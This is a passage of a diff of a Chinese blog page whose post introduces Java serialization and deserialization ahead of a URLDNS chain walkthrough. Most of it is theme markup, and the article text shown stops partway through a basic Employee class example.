@@ -1,197 +1,509 @@
-<!DOCTYPE html>
-<html lang=zh>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta property="og:type" content="article">
-<meta property="og:title" content="JAVA反序列化01-URLDNS链">
-<meta property="og:url" content="https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html">
-<meta property="og:site_name" content="学习记录">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化/image-20221222234312961.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化/image-20221222234423608.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化00/image-20230107151302268.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化00/ReadObjectOneScene.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化00/ysoserial.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230107165219513.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230107165412584.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230108201359461.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230108201644434.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230108201743639.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230108201846973.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230108201952783.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230107171339409.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230107171319093.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230108173643417.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230108183625288.png">
-<meta property="og:image" content="https://example.com/images/JAVA反序列化01/image-20230108183730720.png">
-<meta property="article:published_time" content="2022-07-12T08:34:19.000Z">
-<meta property="article:modified_time" content="2023-01-17T04:12:07.013Z">
-<meta property="article:author" content="MirRoR4s">
-<meta property="article:tag" content="JAVA反序列化">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://example.com/images/JAVA反序列化/image-20221222234312961.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>JAVA反序列化01-URLDNS链</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+<!DOCTYPE HTML>
+<html lang="zh-CN">
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-		<script type="text/x-mathjax-config">
-		  MathJax.Hub.Config({
-			tex2jax: {
-			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
-			  inlineMath: [['$','$']]
-			}
-		  });
-		</script>
-		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
-	
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="JAVA反序列化01-URLDNS链, 学习记录">
+    <meta name="description" content="欢迎来到我的博客">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>JAVA反序列化01-URLDNS链 | 学习记录</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
 <meta name="generator" content="Hexo 6.1.0"></head>
 
-<body class="max-width mx-auto px3 ltr">    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">项目</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">MyGithub</a></li><!--
-     --><!--
-       --><li><a href="/search/">Search</a></li><!--
-     --><!--
-       --><li><a href="/tags/">标签</a></li><!--
-     --><!--
-       --><li><a href="/categories/">分类</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="上一篇" href="/2022/07/13/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E7%A4%BE%E5%8C%BA%E6%80%BB%E7%BB%93/index.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="下一篇" href="/2022/07/12/%E5%8F%8D%E5%BC%B9Shell/index.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&text=JAVA反序列化01-URLDNS链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&title=JAVA反序列化01-URLDNS链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&is_video=false&description=JAVA反序列化01-URLDNS链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=JAVA反序列化01-URLDNS链&body=Check out this article: https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&title=JAVA反序列化01-URLDNS链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&title=JAVA反序列化01-URLDNS链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&title=JAVA反序列化01-URLDNS链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&title=JAVA反序列化01-URLDNS链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&name=JAVA反序列化01-URLDNS链&description=&lt;!--toc--&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&t=JAVA反序列化01-URLDNS链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">学习记录</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
 </ul>
 
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">学习记录</div>
+        <div class="logo-desc">
+            
+            欢迎来到我的博客
+            
+        </div>
     </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ding-yi"><span class="toc-number">1.</span> <span class="toc-text">定义</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shi-me-shi-java-xu-lie-hua-he-fan-xu-lie-hua"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 java 序列化和反序列化？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gong-neng-he-yong-chu"><span class="toc-number">2.</span> <span class="toc-text">功能和用处</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#java-xu-lie-hua-he-fan-xu-lie-hua-you-shi-me-gong-neng-he-yong-chu"><span class="toc-number">2.1.</span> <span class="toc-text">java 序列化和反序列化有什么功能和用处？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shi-me-shi-hou-hui-yong-dao-java-xu-lie-hua-he-fan-xu-lie-hua"><span class="toc-number">2.2.</span> <span class="toc-text">什么时候会用到 Java 序列化和反序列化？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ru-he-jin-xing-java-xu-lie-hua-he-fan-xu-lie-hua"><span class="toc-number">3.</span> <span class="toc-text">如何进行 Java 序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xu-lie-hua-dui-xiang"><span class="toc-number">3.1.</span> <span class="toc-text">序列化对象</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#yong-dao-de-fu-zhu-lei"><span class="toc-number">3.1.1.</span> <span class="toc-text">用到的辅助类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fan-xu-lie-hua-dui-xiang"><span class="toc-number">3.2.</span> <span class="toc-text">反序列化对象</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#yong-dao-de-fu-zhu-lei"><span class="toc-number">3.2.1.</span> <span class="toc-text">用到的辅助类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#xu-lie-hua-dai-ma-shi-li"><span class="toc-number">3.2.2.</span> <span class="toc-text">序列化代码示例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fan-xu-lie-hua-dai-ma-shi-li"><span class="toc-number">3.2.3.</span> <span class="toc-text">反序列化代码示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xu-lie-hua-guo-cheng-zhong-de-zhu-yi-shi-xiang"><span class="toc-number">4.</span> <span class="toc-text">序列化过程中的注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wei-shi-me-hui-chan-sheng-xu-lie-hua-de-an-quan-wen-ti"><span class="toc-number">5.</span> <span class="toc-text">为什么会产生序列化的安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fu-wu-duan-fan-xu-lie-hua-zi-dong-zhi-xing-readobject-fang-fa"><span class="toc-number">5.1.</span> <span class="toc-text">服务端反序列化自动执行 readObject 方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ke-neng-cun-zai-an-quan-lou-dong-de-xing-shi"><span class="toc-number">5.2.</span> <span class="toc-text">可能存在安全漏洞的形式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ru-kou-lei-de-readobject-zhi-jie-diao-yong-wei-xian-fang-fa"><span class="toc-number">5.2.1.</span> <span class="toc-text">入口类的 readObject 直接调用危险方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ru-kou-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-wei-xian-fang-fa-readobject-shi-diao-yong"><span class="toc-number">5.3.</span> <span class="toc-text">入口参数中包含可控类，该类有危险方法， readObject 时调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ru-kou-lei-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-diao-yong-qi-ta-you-wei-xian-fang-fa-de-lei-readobject-shi-diao-yong"><span class="toc-number">5.4.</span> <span class="toc-text">入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gou-zao-han-shu-jing-tai-dai-ma-kuai-deng-lei-jia-zai-shi-yin-shi-zhi-xing"><span class="toc-number">5.5.</span> <span class="toc-text">构造函数&#x2F;静态代码块等类加载时隐式执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chan-sheng-lou-dong-de-gong-ji-lu-xian"><span class="toc-number">6.</span> <span class="toc-text">产生漏洞的攻击路线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shi-zhan-urldns-shi-yong-java-fan-xu-lie-hua-fa-qi-yi-ge-dns-qing-qiu"><span class="toc-number">7.</span> <span class="toc-text">实战—— URLDNS-使用 Java 反序列化发起一个 DNS 请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#qian-yan"><span class="toc-number">7.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fan-xu-lie-hua-guo-cheng-zhong-shi-ru-he-fa-qi-dns-cha-xun-qing-qiu-de"><span class="toc-number">7.2.</span> <span class="toc-text">反序列化过程中是如何发起 DNS 查询请求的？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zhu-yi-shi-xiang"><span class="toc-number">7.3.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-kao-lian-jie"><span class="toc-number">8.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
-  </span>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
 </div>
 
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
     
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">JAVA反序列化01-URLDNS链</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
     
-    <h1 class="posttitle" itemprop="name headline">
-        JAVA反序列化01-URLDNS链
-    </h1>
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
 
+    #articleContent :focus {
+        outline: none;
+    }
 
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
 
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">MirRoR4s</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2022-07-12T08:34:19.000Z" itemprop="datePublished">2022-07-12</time>
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">JAVA反序列化</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" class="post-category">
+                                JAVA安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-07-12
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-01-17
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.8k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    15 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
         
-        (Updated: <time datetime="2023-01-17T04:12:07.013Z" itemprop="dateModified">2023-01-17</time>)
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
         
-      
-    </div>
 
+        
 
-      
-    <div class="article-category">
-        <i class="fas fa-archive"></i>
-        <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
-    </div>
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <!--toc-->
 
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link-link" href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">JAVA反序列化</a>
-    </div>
-
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <!--toc-->
 <span id="more"></span>
+
 <p>学习完反射就可以正式开始学习 Java 反序列化。</p>
 <h3 id="ding-yi"><a href="#定义" class="headerlink" title="定义"></a>定义<a href="#ding-yi" class="header-anchor">#</a></h3><h4 id="shi-me-shi-java-xu-lie-hua-he-fan-xu-lie-hua"><a href="#什么是-java-序列化和反序列化？" class="headerlink" title="什么是 java 序列化和反序列化？"></a>什么是 java 序列化和反序列化？<a href="#shi-me-shi-java-xu-lie-hua-he-fan-xu-lie-hua" class="header-anchor">#</a></h4><p>Java 序列化是指把 Java 对象转换为字节序列的过程，而 Java 反序列化是指把字节序列恢复为 Java 对象的过程。</p>
 <p>序列化分为两大部分：序列化和反序列化。序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求数据的对象实例。</p>
@@ -203,20 +515,123 @@
 <li>想通过RMI传输对象的时候</li>
 </ul>
 <h3 id="ru-he-jin-xing-java-xu-lie-hua-he-fan-xu-lie-hua"><a href="#如何进行-Java-序列化和反序列化" class="headerlink" title="如何进行 Java 序列化和反序列化"></a>如何进行 Java 序列化和反序列化<a href="#ru-he-jin-xing-java-xu-lie-hua-he-fan-xu-lie-hua" class="header-anchor">#</a></h3><p>假设我们定义了如下的 Employee 类，该类实现了 Serializable 接口。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line">   <span class="keyword">public</span> String address;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">transient</span> <span class="type">int</span> SSN; <span class="comment">//注意 transient 